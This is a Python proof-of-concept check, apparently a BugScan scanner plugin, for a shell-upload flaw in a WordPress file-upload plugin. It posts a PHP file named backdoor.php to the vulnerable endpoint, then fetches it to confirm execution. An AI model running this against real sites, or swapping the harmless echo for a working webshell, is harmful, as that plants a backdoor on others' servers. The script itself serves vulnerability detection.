

#!/usr/bin/env python
# -*- coding: utf-8 -*-


__author__ = 'tyq'
# Name:  Wordpress Work the flow file upload 2.5.2 Shell Upload Vulnerability
# Refer: https://www.bugscan.net/#!/x/21599


def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
   

    path = "/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php"
    payload = arg + path
    filename = "Content-Disposition: backdoor.php"
    shell = "<?php echo md5(123)?>"
    code, head, res, _, _ = curl.curl('-H \'%s\' -d \'%s\' %s' % (filename, shell, payload))
    uploadfile = 'wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/files/backdoor.php'
    code, head, res, _, _ = curl.curl(arg + uploadfile)
    if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
        security_hole("webshell url:%s" % (arg + uploadfile))





if __name__ == '__main__':
    from dummy import *
    audit(assign('wordpress', 'http://192.168.121.130/wordpress/')[1])
